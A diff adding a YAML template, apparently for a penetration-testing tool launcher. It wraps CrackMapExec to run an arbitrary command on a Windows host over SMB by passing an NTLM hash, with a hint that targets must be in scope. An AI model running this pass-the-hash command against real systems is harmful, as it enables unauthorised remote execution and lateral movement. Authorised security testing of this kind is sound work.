@@ -1,0 +1,28 @@
+name: CrackMapExec SMB Hash Execute
+description: Execute a command via CrackMapExec using NTLM hash.
+tags:
+  - windows
+  - smb
+  - crackmapexec
+  - execution
+  - hash
+shell: "crackmapexec smb {{target}} -H {{hash}} -x '{{command}}'"
+inputs:
+  - id: target
+    prompt: "Target IP or hostname"
+    type: host
+    required: true
+    secret: false
+    validation_hint: "must be an IP address or hostname within scope"
+  - id: hash
+    prompt: "NTLM hash"
+    type: secret
+    required: true
+    secret: true
+    validation_hint: "NTLM hash of the user"
+  - id: command
+    prompt: "Command to execute"
+    type: string
+    required: true
+    secret: false
+    validation_hint: "command to run on the target"
